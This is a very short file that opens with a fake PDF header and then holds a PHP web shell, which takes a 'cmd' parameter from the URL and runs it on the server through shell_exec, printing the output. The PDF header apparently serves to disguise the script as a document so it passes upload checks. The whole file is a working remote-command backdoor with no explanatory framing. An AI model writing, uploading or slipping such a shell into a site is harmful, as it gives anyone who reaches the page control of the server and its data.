%PDF-1.2%
<?php
echo "<pre>\n";
echo "cmd = ".$_GET['cmd'];
$cmd = $_GET['cmd'];
echo shell_exec((string)$cmd);
echo "</pre>";
?>

